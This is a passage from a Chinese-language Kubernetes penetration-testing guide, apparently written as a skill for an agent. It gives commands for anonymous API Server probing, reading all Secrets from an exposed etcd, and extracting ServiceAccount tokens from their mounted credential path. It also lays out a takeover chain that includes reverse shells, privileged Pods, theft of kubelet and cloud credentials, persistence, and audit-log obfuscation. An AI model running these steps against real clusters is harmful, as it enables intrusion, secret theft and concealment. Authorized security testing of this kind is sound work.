## 五、Kubernetes 深度攻击链（API Server → 集群接管）

### 5.1 K8s 攻击面全景

| 攻击面 | 风险 | 测试方法 |
|--------|------|---------|
| API Server (6443) | 未授权/认证绕过/匿名访问 | curl 匿名探测 + `kubectl get` 无凭据尝试 |
| etcd (2379) | 全部集群数据（含 Secret）泄露 | 端口暴露检测 + etcdctl 未认证读取 |
| Kubelet (10250/10255) | 未认证 API / exec | `/pods` `/run` 匿名访问测试 |
| ServiceAccount Token | Pod 内自动挂载，权限滥用 | 容器内读 token → kubectl 测试 |
| RBAC | 过度授权（cluster-admin 泛滥） | `auth can-i --list` 审计 |
| NetworkPolicy | 默认全通 → 横向移动 | Pod 间连通性测试 |
| Admission Controller | 策略绕过（PSA/OPA/Kyverno 缺陷） | 特权 Pod 创建测试 |
| Ingress Controller | 配置注入 RCE / Secret 泄露 | ingress-nginx CVE 系列测试 |
| Dashboard | 未认证/弱认证 | 8001 端口探测 |
| Helm Tiller / 旧组件 | 遗留高危组件 | 组件指纹识别 |
| CSI 驱动 | 路径穿越删除/篡改数据 | CVE-2026-3864/3865 (NFS/SMB subDir) |
| 云集成 | IRSA/Workload Identity 过度授权 | SA annotation 审计 → 云 API 越权 |

### 5.2 API Server 未授权访问（集群接管起点）

```bash
# 匿名访问探测（system:anonymous 默认可访问部分端点）
curl -sk https://target:6443/api | head -5
curl -sk https://target:6443/api/v1/namespaces/default/pods   # 期望 403/401
curl -sk https://target:6443/version                          # 期望 200（公开端点）

# 匿名用户授权过大时直接列资源
curl -sk -H "Authorization: Bearer" https://target:6443/api/v1/secrets

# 权限绕过组合拳（匿名/弱凭据场景）
# - system:unauthenticated 组绑定过多 RBAC（审计 system:unauthenticated 相关 RoleBinding）
# - 老版本 <=1.19 匿名用户默认可读部分资源
# - 弱 admin token / 泄露的 kubeconfig / 控制平面服务账号滥用
```

### 5.3 etcd 未授权 → 直接接管

```bash
# etcd 2379 暴露探测（常因控制平面安全组配置错误暴露）
etcdctl --endpoints=https://etcd:2379 --insecure-skip-tls-verify get / --prefix --keys-only | head -50

# 读取全部 Secret（cluster-admin 级数据）
etcdctl --endpoints=https://etcd:2379 --insecure-skip-tls-verify \
  get /registry/secrets --prefix --keys-only

# 替换/伪造资源实现持久化（如篡改 serviceaccounts 或 rolebindings）
# 防御：etcd 需 TLS 客户端认证 + 网络隔离 + Secret 静态加密
```

### 5.4 完整攻击链：API Server 未授权 → 集群接管 → 逃逸 → 云凭据

```
攻击链（贯穿全技能的主线）：
① 初始访问（任一）：应用 RCE / 未授权 API / 镜像投毒 / Dashboard 弱口令
② 落地 Pod：应用漏洞 RCE → 写文件/反弹 Shell 进入容器
③ 容器内信息收集：SA Token、namespace、网络拓扑、可访问服务
④ RBAC 枚举：kubectl auth can-i --list（看是否 pods/create / pods/exec / secrets get / nodes/proxy）
⑤ 集群内提权：
   - 有 pods/create → 创建特权 Pod（hostPID/hostNetwork/hostPath=/）→ 见 6.1
   - 有 secrets get → 直接偷高权 SA Token
   - 有 nodes/proxy → kubelet /exec（见第七章）
   - 直接拿到高权 Token → cluster-admin
⑥ 容器逃逸：特权容器/CAP/CVE（第三、四章）
⑦ 节点沦陷：kubelet 客户端证书（/var/lib/kubelet/pki/）→ 节点身份认证 API
⑧ 云凭据：实例元数据服务 / IRSA / Workload Identity → S3/云 API 越权
⑨ 持久化 + 痕迹清理：恶意 Deployment/CronJob/DaemonSet + 审计日志混淆
```

### 5.5 ServiceAccount Token 利用

```bash
# 容器内提取
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
KUBE_SERVER=https://kubernetes.default.svc

# 用 Token 访问 API
kubectl --token=$TOKEN --server=$KUBE_SERVER --certificate-authority=$CA get pods -n $NS
kubectl --token=$TOKEN --server=$KUBE_SERVER --insecure-skip-tls-verify get pods -n kube-system

# 快速枚举当前身份权限（读操作，低告警）
kubectl auth can-i --list
kubectl auth can-i create pods --as=system:serviceaccount:$NS:default
kubectl auth can-i get secrets -n kube-system

# Token 结构解析（JWT）
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .
```

